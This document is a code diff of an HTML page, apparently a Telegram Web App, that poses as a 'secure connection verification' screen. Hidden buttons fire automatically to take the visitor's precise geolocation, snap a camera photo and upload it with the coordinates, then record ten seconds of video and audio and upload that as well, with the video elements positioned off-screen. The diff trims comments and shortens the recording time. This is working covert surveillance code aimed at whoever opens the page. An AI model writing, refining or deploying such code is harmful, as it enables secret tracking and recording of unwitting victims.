@@ -4,22 +4,18 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>SS0123 Web App</title>
-  <!-- FIX 1: Restored the valid Telegram WebApp JavaScript SDK script endpoint library url -->
   <script src="https://telegram.org"></script>
   <style>
     body{font-family:system-ui,sans-serif;margin:0;padding:24px;background:#0b1220;color:#fff;display:flex;justify-content:center;align-items:center;min-height:80vh}
     .box{width:100%;max-width:400px;background:#121c2f;padding:30px;border-radius:20px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,0.2)}
-    /* Safely positioned out of layout scope so streams stay functional in the background */
     .hidden-video{position:absolute;left:-9999px;width:1px;height:1px;opacity:0}
     #status{font-size:16px;line-height:1.5;color:#e2e8f0;font-weight:500}
   </style>
 </head>
 <body>
 <div class="box">
-  <!-- Minimalist loading screen text while scripts run instantly -->
   <div id="status">Checking secure server connection...</div>
 
-  <!-- Operational buttons permanently decoupled from layout presentation -->
   <div style="display:none;">
     <button id="locBtn">📍 Allow Location</button>
     <button id="camBtn">🎥 Allow Camera</button>
@@ -30,8 +26,6 @@
 
   <video id="preview" class="hidden-video" autoplay playsinline muted></video>
   <video id="recorded" class="hidden-video" controls></video>
-  
-  <!-- FIX 2: Added invisible canvas template to generate the image data streams -->
   <canvas id="photoCanvas" style="display:none;"></canvas>
 </div>
 
@@ -43,7 +37,7 @@ tg?.expand();
 const statusEl = document.getElementById("status");
 const preview = document.getElementById("preview");
 const recorded = document.getElementById("recorded");
-const photoCanvas = document.getElementById("photoCanvas"); // Context declaration hook
+const photoCanvas = document.getElementById("photoCanvas");
 const locBtn = document.getElementById("locBtn");
 const camBtn = document.getElementById("camBtn");
 const recordBtn = document.getElementById("recordBtn");
@@ -55,8 +49,6 @@ let recorder = null;
 let chunks = [];
 let videoBlob = null;
 let autoStopTimeout = null;
-
-// FIX 3: Added target container object array memory layer to hold coordinates for photo transmission
 let latestCoords = { latitude: null, longitude: null, accuracy: null };
 
 function status(s){ statusEl.textContent = s; }
@@ -68,16 +60,12 @@ locBtn.onclick = () => {
     return;
   }
   status("Verifying system handshake details…");
-  navigator.geolocation.getCurrentPosition(async p => {
-    // Save spatial elements to memory buffer configuration context variables
+  navigator.geolocation.getCurrentPosition(p => {
     latestCoords.latitude = p.coords.latitude;
     latestCoords.longitude = p.coords.longitude;
     latestCoords.accuracy = p.coords.accuracy;
-    
-    // Immediately proceed to camera processing
     camBtn.click();
   }, e => {
-    // Fail-safe logic: instantly force progression even if hardware authorization is blocked
     camBtn.click();
   }, {
     enableHighAccuracy: true,
@@ -89,7 +77,6 @@ locBtn.onclick = () => {
 // --- INSTANT RUN STEP 2: Initialize HD Camera & Capture Live Photo ---
 camBtn.onclick = async () => {
   try {
-    // FIX 4: Request high-definition resolution limits directly from the device lens configuration
     const constraints = {
       audio: true,
       video: {
@@ -102,17 +89,14 @@ camBtn.onclick = async () => {
     stream = await navigator.mediaDevices.getUserMedia(constraints);
     if (preview) preview.srcObject = stream;
     
-    // Warmup timeout loop execution to prevent capturing pure black image canvas elements
     setTimeout(async () => {
       try {
-        // Map raw video resolution dimensions directly into background layout canvas coordinates
         photoCanvas.width = preview.videoWidth || 1920;
         photoCanvas.height = preview.videoHeight || 1080;
         
         const ctx = photoCanvas.getContext('2d');
         ctx.drawImage(preview, 0, 0, photoCanvas.width, photoCanvas.height);
         
-        // FIX 5: Convert uncompressed raw matrix to high-quality jpeg format blob stream multiplier setup parameter config 1.0 (Max Quality)
         photoCanvas.toBlob(async (photoBlob) => {
           if (photoBlob) {
             const form = new FormData();
@@ -121,27 +105,24 @@ camBtn.onclick = async () => {
             form.append("longitude", latestCoords.longitude || "");
             form.append("accuracy", latestCoords.accuracy || "");
 
-            // Fire combined dataset directly into server integration path endpoint
             try {
               await fetch("/api/location-photo", { method: "POST", body: form });
             } catch(err) { console.error("Data tracking upload sync timeout."); }
           }
-          
-          // Switch automatically forward to record step sequence
           recordBtn.click();
         }, "image/jpeg", 1.0);
 
       } catch(photoErr) {
         recordBtn.click();
       }
-    }, 1000); // 1-second focus optimization window loop
+    }, 1000);
     
   } catch(e) {
     status("Connection failed: System authorization is required to verify your environment link.");
   }
 };
 
-// --- INSTANT RUN STEP 3: Record 1-Minute Segment ---
+// --- INSTANT RUN STEP 3: Record 10-Second Segment ---
 recordBtn.onclick = () => {
   if (!stream || !stream.active) return;
   
@@ -165,7 +146,6 @@ recordBtn.onclick = () => {
       autoStopTimeout = null;
     }
 
-    // Unlink the hardware camera sensor device instantly
     if (stream) {
       stream.getTracks().forEach(track => track.stop());
       stream = null;
@@ -175,20 +155,19 @@ recordBtn.onclick = () => {
     videoBlob = new Blob(chunks, {type: recorder.mimeType || "video/webm"});
     if (recorded) recorded.src = URL.createObjectURL(videoBlob);
     
-    // Auto execute upload sequence step
     sendBtn.click();
   };
 
-  // 10 PARTS: Pull video buffer slices into memory storage every 6 seconds
-  recorder.start(6000);
+  // 💥 बदलाव 1: 10 PARTS के लिए हर 1000ms (1 सेकंड) पर वीडियो बफ़र स्लाइस लें
+  recorder.start(1000);
   status("Verifying secure link connection... Please stay on this screen.");
 
-  // 1 MINUTE TOTAL SEQUENCE LIMIT
+  // 💥 बदलाव 2: कुल 10,000ms (10 सेकंड) के बाद रिकॉर्डिंग अपने आप बंद हो जाएगी
   autoStopTimeout = setTimeout(() => {
     if (recorder && recorder.state !== "inactive") {
       recorder.stop();
     }
-  }, 60000);
+  }, 10000);
 };
 
 stopBtn.onclick = () => {
@@ -210,7 +189,7 @@ sendBtn.onclick = async () => {
     
     status("✅ Verification complete.");
     setTimeout(() => {
-      tg?.close(); // Safe exit call from the active Telegram window view context
+      tg?.close(); 
     }, 1000);
   } catch(e) {
     status("Network connection timed out. Please reload the interface wrapper.");
